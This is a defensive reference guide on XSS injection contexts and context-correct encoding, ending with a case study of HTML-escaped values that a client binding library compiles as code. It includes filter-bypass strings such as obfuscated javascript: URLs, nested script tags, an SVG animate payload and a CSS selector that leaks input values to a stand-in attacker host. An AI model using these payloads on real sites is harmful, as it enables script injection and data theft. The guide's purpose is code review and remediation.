# Injection Contexts and Correct Encoding

The single most useful question in XSS analysis: **what parser state is the
untrusted byte in?** Encoding is only correct relative to a context. This file
is the matrix.

## Contents

- [The context matrix](#the-context-matrix)
- [HTML text content](#html-text-content)
- [Quoted attribute values](#quoted-attribute-values)
- [Unquoted attribute values](#unquoted-attribute-values)
- [Event handler attributes](#event-handler-attributes)
- [JavaScript contexts](#javascript-contexts)
- [URL contexts](#url-contexts)
- [CSS contexts](#css-contexts)
- [SVG and MathML](#svg-and-mathml)
- [Special parsing states](#special-parsing-states)
- [Recurring encoder mistakes](#recurring-encoder-mistakes)
- [Double encoding and double decoding](#double-encoding-and-double-decoding)

---

## The context matrix

| Context | What breaks out | Correct defense |
|---|---|---|
| HTML text node | `<` `&` | HTML entity encoding |
| Quoted attribute | the matching quote, `&` | Attribute encoding + always quote |
| Unquoted attribute | space, tab, newline, `/`, `>`, backtick, `=` | Quote the attribute, then encode |
| Event handler attr | HTML-decode then JS-parse (two passes) | Never place untrusted data here |
| JS string literal | `'` `"` `\` `</script` `<!--` U+2028 U+2029 | JSON-serialize + escape `<` as `\u003c` |
| JS code position | everything | Never place untrusted data here |
| URL in `href`/`src` | `javascript:` `data:` `vbscript:` | Scheme allowlist after normalization |
| CSS value | `}` `;` `url(` `expression(` `@import` | Allowlist values; never interpolate raw |
| CSS `url()` | quote breakout, `javascript:` | Scheme allowlist + quote |
| HTML comment | `-->` `--!>` | Do not put untrusted data in comments |
| `<style>` / `<script>` / `<textarea>` / `<title>` | the closing tag string | Context-specific; see below |

Rule of thumb: an untrusted value should appear in **exactly one** context, and
that context should be known at development time. Anything that can land in
multiple contexts depending on data is a design flaw worth reporting on its own.

---

## HTML text content

```html
<p>Hello, USERDATA</p>
```

Encode `<`, `>`, `&`, and — defensively — `"` and `'`. Encoding `<` alone is
sufficient for pure text-node context, but encoding the full set survives later
refactoring that moves the value into an attribute.

This is the only context where "just HTML-escape it" is straightforwardly right,
which is why developers apply it everywhere and why so many bugs exist.

---

## Quoted attribute values

```html
<input value="USERDATA">
<div title='USERDATA'>
```

Encode the matching quote character and `&`. Note that **single-quoted
attributes need `'` encoded**, and a surprising number of encoders escape only
`"`. PHP's `htmlspecialchars()` without `ENT_QUOTES` is the classic case: it
escapes `"` but historically not `'`. Always pass `ENT_QUOTES | ENT_HTML5`.

Also verify the attribute is not one where a *value* is interpreted:
`href`, `src`, `action`, `formaction`, `data`, `srcdoc`, `style`, any `on*`.
Those have their own rules below — attribute encoding does not save them.

---

## Unquoted attribute values

```html
<input value=USERDATA>
```

Breakout needs no quote at all — a space, tab, newline, form feed, `/`, or
backtick ends the value and lets a new attribute start, e.g. `x onfocus=...`.
Backtick matters because some legacy parsers treat it as a quote.

The correct fix is not to encode more aggressively; it is to **quote the
attribute**. Report unquoted attributes as a finding even when the current
encoder happens to block spaces, because the escape is one refactor away from
failing.

Template engines that build attributes from dictionaries
(`{% for k,v in attrs %}{{k}}={{v}}{% endfor %}`) are a reliable source of this.

---

## Event handler attributes

```html
<button onclick="doThing('USERDATA')">
```

This is a **double-decoding context**: the HTML parser decodes entities first,
then the JS parser runs on the result. So `&#39;` becomes `'` before JS sees it —
HTML-encoding does not protect a JS string here, it just delays it one step.

The only reliable answer is to not place untrusted data in event handler
attributes at all. Use `addEventListener` and pass the data via a `data-*`
attribute (HTML-attribute-encoded) read with `dataset`, or via a closure.

If it must stay inline, the value needs JS escaping *and* HTML attribute
encoding applied in the correct order — treat any code doing this as suspect and
recommend restructuring.

---

## JavaScript contexts

### Inside a string literal in a `<script>` block

```html
<script>var name = "USERDATA";</script>
```

Dangerous characters: `"`, `'`, `\`, and — critically — `</script`, which
terminates the script element *regardless of JS string context*, because the
HTML tokenizer wins. Also `<!--` and `<script` can shift the parser into
odd states, and U+2028/U+2029 are line terminators in older JS engines.

Correct defense: serialize the value with `JSON.stringify`, then escape `<`, `>`,
`&`, U+2028 and U+2029 as `\u003c`, `\u003e`, `\u0026`, `\u2028`, `\u2029`.
Many frameworks ship a helper (`json_script` in Django, `to_json` +
`escape_javascript` in Rails, `@json` in Blade).

Better structural pattern — take the data out of the script context entirely:

```html
<script type="application/json" id="cfg">{"name": "USERDATA"}</script>
<script>const cfg = JSON.parse(document.getElementById('cfg').textContent);</script>
```

`<script type="application/json">` content is not executed and its text is not
HTML-parsed as markup, so a single HTML-escape of `<` on the JSON is sufficient.
Still escape `</script>` inside strings.

### Inside a code position

```html
<script>var x = USERDATA;</script>
<script>doThing(USERDATA);</script>
```

There is no encoding that makes arbitrary data safe here. Either constrain the
value to a strict type (integer parsed and re-serialized, boolean, enum member
validated against an allowlist) or move it to the JSON pattern above.

### Template literals

```js
const html = `<div>${userData}</div>`;
```

Backticks and `${` are the breakout characters when the *template itself* is
built from untrusted data. When only the interpolation is untrusted, the risk is
the resulting HTML string reaching an `innerHTML` sink — that is an HTML-context
problem, not a JS one.

---

## URL contexts

```html
<a href="USERDATA">
<img src="USERDATA">
<form action="USERDATA">
<iframe src="USERDATA">
```

Attribute encoding is irrelevant here — `javascript:alert(1)` contains no
special HTML characters. The defense is a **scheme allowlist after
normalization**:

```js
function safeUrl(raw) {
  let u;
  try { u = new URL(raw, document.baseURI); } catch { return '#'; }
  return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#';
}
```

What defeats naive checks:

- Leading/embedded whitespace and control characters: `\tjavascript:`,
  ` javascript:`, `java\nscript:`, `\x00javascript:` — browsers strip these
  before scheme parsing
- Case: `JaVaScRiPt:`
- HTML entities, when the value passed through markup: `&#106;avascript:`
- URL-encoded colon: `javascript%3aalert(1)` (relevant when the value is
  decoded before use)
- `data:text/html;base64,...` — treat `data:` as blocked in `href`/`src`
- Protocol-relative `//attacker.example` for open redirect (not XSS, but usually
  the same code path and worth reporting together)

Relative-path-only requirements should be enforced positively (must start with
a single `/` and not `//` or `/\`), not by blocklisting schemes.

Also: `srcdoc` on an iframe is an **HTML** context, not a URL context —
its content is parsed as a full document, with entity decoding, so it needs
HTML-escaping of the whole document string.

---

## CSS contexts

```html
<div style="width: USERDATA">
<style>.cls { background: url(USERDATA); }</style>
```

Script execution from CSS is largely historical (`expression()` in old IE,
`-moz-binding`), but CSS injection is still a real finding:

- Data exfiltration via attribute selectors plus a network-fetching property:
  `input[value^="a"] { background: url(//attacker/a); }` leaks a value character
  by character
- `@import` pulling attacker CSS
- Overlay/defacement attacks enabling clickjacking-style deception
- `url(javascript:...)` in legacy engines

Do not interpolate untrusted data into CSS. Where a user must control styling,
allowlist properties and validate values against strict patterns (a colour hex,
a number plus unit), and never let a `url()` value come from input without a
scheme allowlist.

---

## SVG and MathML

SVG is HTML's most common sanitizer bypass surface because it is *foreign
content* with different parsing rules:

- `<svg><script>` executes
- `<svg><foreignObject>` re-enters HTML parsing
- `xlink:href` and `href` on `<a>` accept `javascript:` in older engines
- `<animate attributeName="href" values="javascript:alert(1)">` sets an attribute
  without ever containing the scheme in a static attribute position
- `<set>`, `<use>` with external references
- Event attributes on SVG elements: `onbegin`, `onend`, `onrepeat`, `onload`

Practical consequences worth reporting:

- **User-uploaded SVG served inline from the app origin is stored XSS.** Serve
  uploads from a separate sandbox origin, with `Content-Disposition: attachment`
  or a strict `Content-Security-Policy` on the response, and
  `X-Content-Type-Options: nosniff`. Rasterizing on upload also removes the
  issue.
- Sanitizer configs that add `svg`/`math` to the allowlist need scrutiny: it
  substantially widens the parser surface and is where several historic
  sanitizer bypasses lived.

---

## Special parsing states

Elements whose content model changes the rules:

| Element | Behaviour | Consequence |
|---|---|---|
| `<script>` | raw text; only `</script` ends it | Entity encoding does nothing |
| `<style>` | raw text; only `</style` ends it | Same |
| `<textarea>`, `<title>` | escapable raw text; entities decode | Escaping `<` suffices, but the closing tag string ends it |
| `<noscript>` | parsed differently depending on scripting-enabled flag | Classic mXSS surface |
| `<template>` | content parsed into a separate document fragment | Sanitizer/browser disagreement surface |
| `<iframe srcdoc>` | attribute value is a full HTML document | Needs double escaping |
| `<!-- -->` | ends at `-->` and (legacy) `--!>` | Never put input in comments |
| `<xmp>`, `<plaintext>`, `<listing>` | legacy raw-text elements | Rare but bypass sanitizers that do not model them |

**Mutation XSS** lives in the gaps between these states. If sanitized markup is
re-serialized and re-parsed, the second parse can produce different elements than
the sanitizer saw. Detection rule: find any place where sanitizer output is
modified, stored, wrapped, or round-tripped through `innerHTML` before display,
and flag it. Sanitize as the last step before insertion.

---

## Recurring encoder mistakes

A short list that catches a large share of real findings:

1. **HTML-encoding applied to a JS or URL context.** The most common single
   mistake. `&quot;` does nothing against `javascript:`.
2. **`htmlspecialchars()` without `ENT_QUOTES`** in PHP, combined with
   single-quoted attributes.
3. **`escape()` / `encodeURIComponent()` used as HTML escaping.** They are URL
   functions; they do not encode `<`.
4. **Escaping on input instead of output.** Breaks when the same data is later
   rendered into a different context, and misses data written by other paths.
5. **Blocklist filters** stripping `<script>` or `javascript:` — bypassable by
   case, nesting (`<scr<script>ipt>`), alternate tags, and event attributes.
   Report the approach itself as the defect.
6. **Escape-hatch in a "trusted" branch** — `|safe` applied because the value is
   "admin-controlled", where admin content is itself user-submitted or where a
   lower-privileged role can reach the field.
7. **Autoescaping disabled globally** in the template engine config; every
   template becomes a potential sink.
8. **Markdown renderers with raw HTML enabled.** `marked`, `markdown-it`,
   `showdown` etc. pass through HTML by default or on a flag. The renderer output
   must be sanitized, or raw HTML disabled.
9. **Escaping then decoding.** Server escapes, client calls
   `decodeURIComponent` or assigns through a sink that decodes entities.
10. **Encoding the value but not the attribute name** in dynamic attribute
    construction.

---

## Double encoding and double decoding

Where a value passes through more than one decode step — proxy, framework
middleware, application-level `decodeURIComponent`, then a sink that decodes
entities — an input like `%253Cscript%253E` can arrive as `<script>` after two
decodes.

When reviewing, count the decodes along the path and compare with the number of
encodes. Mismatch is the bug. The structural fix is to decode exactly once, as
early as possible, and to encode exactly once, as late as possible, at the point
where the context is known.

---

## HTML-escaping into an attribute the client compiles as code

The encoder mistakes above assume the attribute value stays an attribute value.
This construction breaks that assumption: the value is HTML-escaped correctly,
and is still injectable, because something on the client reads the attribute
back and evaluates it as source code.

**Construction.** A client-side binding library keeps its expressions in DOM
attributes rather than in script blocks — the attribute body is a small
JavaScript expression (an object literal, a method call, a property path). At
bind time the library walks the DOM, reads those attributes with
`getAttribute()`, concatenates the result into a function body, and compiles it
with `new Function` / `eval`. The server, rendering that same attribute, wants
to pass a runtime value into the expression, so it interpolates it into a
quoted JS string inside the attribute — and applies the template engine's
default escaping, which is HTML escaping.

Rendered, that looks correct:

```html
<form data-bind="{ pref: new Pref(ctx, {value: &#39;USERVALUE&#39;}) }">
```

**Why the defense fails.** HTML escaping and the compile step are separated by
a decode the developer never accounts for. `getAttribute()` returns the
**HTML-decoded** value, so every `&#39;` becomes `'` — including the ones the
attacker supplied. After decoding, the injected quote and the template's own
delimiter are byte-identical and the parser cannot distinguish them:

```js
{ pref: new Pref(ctx, {value: 'USER'+payload+'VALUE'}) }
```

That string is then handed to `new Function`. HTML escaping has protected the
HTML parser, which was never the consumer. The consumer is a JS parser, and the
correct encoder for it is JSON serialization or JS-string escaping.

This also sidesteps a nonce-based CSP entirely. Nothing injects a `<script>`
element, so the nonce is never consulted; the code runs through the eval-family
sink, which only `'unsafe-eval'` governs. A team that has correctly deployed a
per-request nonce can still be fully exposed here.

**Detection signal.**
1. Grep the shipped bundle for `new Function(` together with `with(` — binding
   libraries that build a scope object use that pair. A hit means DOM
   attributes are a code path.
2. Read the CSP: if `script-src` carries `'unsafe-eval'`, the sink is reachable.
3. In the rendered DOM, look for attributes whose values are *expressions*
   rather than data — an attribute containing `new `, `(`, `{` and a quoted
   literal. Then ask which of those literals is a runtime value.
4. Fastest confirmation: submit a value containing an apostrophe into any field
   you can see rendered into such an attribute, then look at the **raw**
   response. If your quote comes back as an entity *and so do the template's
   own delimiters*, you have the construction.

**Verification (offline, no requests to the target).** Once you have the raw
attribute text from a single response, the rest is browser semantics and can be
settled locally:

```js
const host = document.createElement('div');
host.innerHTML = '<form data-bind="' + rawAttributeTextFromResponse + '"></form>';
const decoded = host.querySelector('form').getAttribute('data-bind');
// decoded now shows whether your quotes survived as real quotes
new Function('ctx', 'with(ctx) { return ' + decoded + ' }');  // compiles or throws
```

If `getAttribute()` yields valid JS containing your expression and the compile
succeeds, the mechanism is proven without further traffic. This matters when
the target rate-limits: a 429 on a follow-up request looks exactly like "the
payload did not execute", and will produce a false negative if you do not check
the status code.

**Counter-check.** Not this construction if any of these hold: the value is
emitted with `JSON.stringify`-style encoding (quotes arrive as `'` or the
literal is a JSON scalar); the attribute is read with `dataset` and used as
data rather than concatenated into a compiled string; the library uses a real
parser over the attribute rather than `new Function`; or the CSP omits
`'unsafe-eval'` and the library has a CSP-safe mode.

**Exploitability is a separate question — answer it before celebrating.** The
construction proves the *encoder* is wrong. Whether a remote attacker can reach
it depends on the delivery path, and the common outcome is that they cannot:

- Does the tainted value arrive by GET? Then it is reflected XSS.
- Does it persist and render for other viewers? Then it is stored XSS.
- Does it only appear on a validation-error re-render of a state-changing POST?
  Then delivery needs the victim's anti-CSRF token, and if that token is
  session-bound the only reachable scenario is the user attacking themselves.

That last case is extremely common, because the fields that fail validation
hardest are exactly the ones re-rendered with the submitted value. Most
programs classify it as self-XSS and reject it. Check whether a value that
*passes* validation can also carry a quote — an allowlisted enum will not, a
loose format regex might.

**Remediation.** Encode for the context that actually consumes the value: the
value is destined for a JS parser, so serialize it as JSON or apply JS-string
escaping, not HTML escaping. Better, remove the dual-consumer problem — put
runtime values in an ordinary data attribute read via `dataset` and keep
expression attributes free of interpolation, so no attribute is both markup and
source. Structurally, dropping `'unsafe-eval'` removes the escalation from any
attribute injection on that origin.

**Confidence: seen once.** One application — server-rendered templates plus an
attribute-driven client binding library, under a per-request nonce CSP that also
carried `'unsafe-eval'`. The *class* is not rare: any library that compiles DOM
attributes with `new Function` has this shape, and several popular ones do. But
this file has one observation behind it, not a survey. Treat the detection
signal as reliable and the frequency as unknown.
